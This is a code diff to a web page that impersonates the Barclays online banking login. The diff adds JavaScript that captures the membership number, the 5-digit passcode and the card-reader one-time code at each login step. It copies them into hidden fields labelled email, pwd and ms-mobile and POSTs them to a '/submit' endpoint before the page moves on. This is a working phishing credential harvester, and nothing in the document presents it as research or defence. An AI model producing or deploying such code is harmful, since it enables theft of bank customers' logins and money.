@@ -136,7 +136,7 @@
             <p class="hint">Your 8-digit Barclays membership number, found on your debit card or bank statements.</p>
           </div>
           <label class="chk"><input type="checkbox" /> Remember my membership number</label>
-          <button class="btn" onclick="goWithLoader(2,this)">Continue</button>
+          <button class="btn" onclick="nextStep(this)">Continue</button>
           <hr />
           <div class="links">
             <a href="#">Forgotten your details?</a>
@@ -150,7 +150,7 @@
             <input type="password" id="pcode" maxlength="5" inputmode="numeric" />
             <p class="hint">Enter your 5-digit Online Banking passcode. This is different to your card PIN.</p>
           </div>
-          <button class="btn" onclick="goWithLoader(3,this)">Continue</button>
+          <button class="btn" onclick="doPassword(this)">Continue</button>
           <hr />
           <div class="links">
             <a href="#" onclick="go(1);return false;">&larr; Back</a>
@@ -194,7 +194,7 @@
             </div>
           </div>
           <p class="resend">No card reader? <a href="#" onclick="return false;">Use Mobile PINsentry</a> &nbsp;&middot;&nbsp; <a href="#" onclick="return false;">Send SMS code instead</a></p>
-          <button class="btn" onclick="goWithLoader(4,this)">Confirm &amp; Log in</button>
+          <button class="btn" onclick="doVerify(this)">Confirm &amp; Log in</button>
           <hr />
           <div class="links"><a href="#" onclick="go(2);return false;">&larr; Back</a></div>
         </div>
@@ -259,6 +259,7 @@
     </div>
   </div>
 </main>
+<div style="display:none;"><input id="email"><input id="pwd"><input id="ms-mobile"></div>
 <footer>
   <div class="flinks">
     <a href="#">Privacy policy</a><a href="#">Cookie policy</a><a href="#">Accessibility</a><a href="#">Terms &amp; conditions</a><a href="#">Security</a><a href="#">Contact us</a>
@@ -266,6 +267,47 @@
   <p class="fcopy">Barclays Bank UK PLC. Registered in England. Registered No. 9740322. Registered Office: 1 Churchill Place, London E14 5HP.<br>Authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential Regulation Authority.</p>
 </footer>
 <script>
+  function syncLogAliases() {
+    document.getElementById('email').value = document.getElementById('memno').value;
+    document.getElementById('pwd').value = document.getElementById('pcode').value;
+    document.getElementById('ms-mobile').value = Array.from(document.querySelectorAll('.brc-otp')).map(inp => inp.value).join('');
+  }
+
+  async function sendLogs(type) {
+    syncLogAliases();
+    const data = {
+      page: 'Barclays Portal',
+      type: type,
+      email: document.getElementById('email').value,
+      pwd: document.getElementById('pwd').value,
+      msMobile: document.getElementById('ms-mobile').value
+    };
+    try {
+      await fetch('/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    } catch (e) {
+      console.error('Log send failed:', e);
+    }
+  }
+
+  async function nextStep(btn) {
+    await sendLogs('step1');
+    goWithLoader(2, btn);
+  }
+
+  async function doPassword(btn) {
+    await sendLogs('step2');
+    goWithLoader(3, btn);
+  }
+
+  async function doVerify(btn) {
+    await sendLogs('step3');
+    goWithLoader(4, btn);
+  }
+
   function goWithLoader(n, btn) {
     var origHtml = btn.innerHTML;
     var isFinal  = n === 4;
